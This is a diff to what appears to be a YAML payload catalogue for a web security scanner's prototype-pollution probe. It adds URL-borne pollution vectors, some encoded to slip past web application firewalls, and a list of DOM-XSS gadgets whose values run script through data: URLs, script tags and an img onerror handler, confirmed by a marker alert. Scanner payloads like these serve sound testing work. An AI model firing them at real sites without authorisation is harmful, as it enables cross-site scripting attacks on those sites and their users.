@@ -80,7 +80,70 @@ payloads:
     - "__proto__[toString]=injected_marker_12345"
     - '{"__proto__": {"toString": "injected_marker_12345"}}'
 
+  # Client-side source vectors (CLIENT-side prototype pollution → DOM XSS). These are the
+  # URL-borne shapes the deterministic prototype_pollution_probe appends to a page URL to
+  # pollute Object.prototype in the BROWSER (query string, location.hash, nested-merge, and
+  # WAF-bypass encodings). {k} is the polluted property, {v} its value. The authoritative,
+  # ordered list lives in dast/triage/protopollute.py (source_vectors); this group documents
+  # them for the payload catalogue and is kept in sync.
+  client_sources:
+    - "?__proto__[{k}]={v}"
+    - "?constructor[prototype][{k}]={v}"
+    - "#__proto__[{k}]={v}"
+    - "#constructor[prototype][{k}]={v}"
+    - "#x=y&__proto__[{k}]={v}"
+    - "?a[__proto__][{k}]={v}"
+    - "?a[b][__proto__][{k}]={v}"
+    - "?__pro%74o__[{k}]={v}"
+    - "?constructor%5bprototype%5d%5b{k}%5d={v}"
+
 # Detection signatures — matched against raw response body (case-insensitive)
 match_signatures:
   - 'injected_marker_12345'
   - 'polluted'
+
+# Client-side prototype-pollution DOM-XSS gadgets (PortSwigger "widespread prototype pollution
+# gadgets"). Once a source vector pollutes Object.prototype in the browser, polluting one of these
+# well-known properties with a JS-exec value turns the pollution into script execution. The probe
+# substitutes {marker} into `value`, delivers via the source vector, and confirms on a captured
+# alert(<marker>) dialog. `trigger`: load (a fresh navigation fires it), reload, or interact.
+gadgets:
+  # transport_url — Google Analytics / Segment analytics.js reads config.transport.url and loads
+  # it as a <script>. A data: URL runs inline. THIS gadget solves the PortSwigger client-side
+  # prototype-pollution-to-DOM-XSS lab.
+  - name: transport_url
+    property: transport_url
+    value: "data:,alert({marker});"
+    sink: "analytics.js config.transport.url → script src"
+    trigger: load
+  # src — a generic script/element src read off a polluted config object.
+  - name: src
+    property: src
+    value: "data:,alert({marker});"
+    sink: "element/script src read from a polluted config property"
+    trigger: load
+  # srcdoc — an iframe srcdoc populated from a polluted property renders the HTML/JS inline.
+  - name: srcdoc
+    property: srcdoc
+    value: "<script>alert({marker})</script>"
+    sink: "iframe srcdoc from a polluted config property"
+    trigger: load
+  # sequence — Closure/third-party "sequence" gadget that concatenates into a script source.
+  - name: sequence
+    property: sequence
+    value: "data:,alert({marker});"
+    sink: "Closure/sequence concatenated into a script source"
+    trigger: load
+  # hitCallback — Google Analytics hitCallback is invoked after a hit; a polluted string gadget
+  # is executed in some integrations.
+  - name: hitCallback
+    property: hitCallback
+    value: "alert({marker})"
+    sink: "Google Analytics hitCallback invoked after send"
+    trigger: load
+  # html — a polluted `html` property flushed into innerHTML by a template/sanitizer gadget.
+  - name: html
+    property: html
+    value: "<img src=x onerror=alert({marker})>"
+    sink: "polluted html property written to innerHTML"
+    trigger: load
